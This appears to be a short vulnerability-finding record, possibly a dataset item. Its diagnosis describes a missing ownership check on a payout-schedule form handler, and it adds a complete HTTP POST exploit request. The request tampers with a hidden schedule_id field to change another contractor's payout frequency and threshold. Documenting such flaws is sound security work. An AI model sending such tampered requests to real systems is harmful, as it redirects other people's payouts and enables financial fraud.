diagnosis: In the POST branch of this server-rendered view, the handler retrieves PayoutSchedule using schedule_id extracted directly from request.POST without verifying that schedule.contractor == request.user. A malicious user can tamper with the hidden schedule_id form field to redirect another contractor's payout frequency or bank destination.
exploit_request:
POST /billing/payout-schedule/ HTTP/1.1
Host: portal.freelance.example
Cookie: sessionid=attacker_session
Content-Type: application/x-www-form-urlencoded

schedule_id=9042&frequency=weekly&payout_threshold=0.00
